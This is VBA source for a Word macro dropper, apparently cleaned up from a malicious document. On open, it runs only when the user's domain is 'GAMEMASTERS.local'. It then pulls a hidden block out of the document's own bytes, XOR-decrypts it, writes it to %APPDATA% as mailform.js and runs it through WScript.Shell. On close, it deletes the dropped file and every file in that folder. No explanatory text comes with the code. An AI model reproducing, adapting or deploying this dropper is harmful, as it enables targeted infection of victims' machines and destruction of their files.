Public FILENAME1 As String
Public FILENAME2 As String

Function XOR_FUNCTION(given_string() As Byte, length As Long) As Boolean
    Dim xor_key As Byte
    xor_key = 50
    For i = 0 To length - 1
        given_string(i) = given_string(i) Xor xor_key
        xor_key = ((xor_key Xor 99) Xor (i Mod 254))
        Next i
    XOR_FUNCTION = True
End Function

Sub AutoClose()
    On Error Resume Next
    Kill FILENAME1
    On Error Resume Next
    Set FILESYSTEMOBJECT = CreateObject("Scripting.FileSystemObject")
    FILESYSTEMOBJECT.DeleteFile FILENAME2 & "\*.*", True
    Set FILESYSTEMOBJECT = Nothing
End Sub

Sub AutoOpen()
    On Error GoTo EXITGOTO
        Dim chkDomain As String
        Dim strUserDomain As String
        chkDomain = "GAMEMASTERS.local"
        strUserDomain = Environ$("UserDomain")
        If chkDomain <> strUserDomain Then

        Else
            Dim FILEOBJECT1
            Dim file_length As Long
            file_length = FileLen(ActiveDocument.FullName)
            FILEOBJECT1 = FreeFile
            Open (ActiveDocument.FullName) For Binary As #FILEOBJECT1
            Dim FILECONTENT1() As Byte
            ReDim FILECONTENT1(file_length)
            Get #FILEOBJECT1, 1, FILECONTENT1
            Dim FILECONTENTSTRING1 As String
            FILECONTENTSTRING1 = StrConv(FILECONTENT1, vbUnicode)

            Dim REGEXPMATCH, REGEXPMATCHES
            Dim REGEXP
            Set REGEXP = CreateObject("vbscript.regexp")
            REGEXP.Pattern = "sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
            Set REGEXPMATCHES = REGEXP.Execute(FILECONTENTSTRING1)
            Dim REGEXPMATCHPOSITION
            If REGEXPMATCHES.Count = 0 Then
                GoTo EXITGOTO
            End If
            For Each REGEXPMATCH In REGEXPMATCHES
                REGEXPMATCHPOSITION = REGEXPMATCH.FirstIndex
            Exit For
            Next
            Dim MALICIOUSCONTENT() As Byte
            ReDim MALICIOUSCONTENT(13082)
            Get #FILEOBJECT1, REGEXPMATCHPOSITION + 81, MALICIOUSCONTENT
            If Not XOR_FUNCTION(MALICIOUSCONTENT(), 13082 + 1) Then
                GoTo EXITGOTO
            End If

            FILENAME2 = Environ("appdata") & "\Microsoft\Windows"
            Set FILESYSTEMOBJECT = CreateObject("Scripting.FileSystemObject")
            If Not FILESYSTEMOBJECT.FolderExists(FILENAME2) Then
                FILENAME2 = Environ("appdata")
            End If

            Set FILESYSTEMOBJECT = Nothing
            Dim FILEOBJECT2
            FILEOBJECT2 = FreeFile
            FILENAME1 = FILENAME2 & "\" & "mailform.js"
            Open (FILENAME1) For Binary As #FILEOBJECT2
            Put #FILEOBJECT2, 1, MALICIOUSCONTENT
            Close #FILEOBJECT2
            Erase MALICIOUSCONTENT

            Set SHELL = CreateObject("WScript.Shell")
            SHELL.Run """" + FILENAME1 + """" + " vF8rdgMHKBrvCoCp0ulm"
            ActiveDocument.Save
            Exit Sub
EXITGOTO:
            Close #FILEOBJECT2
            ActiveDocument.Save
        End If
End Sub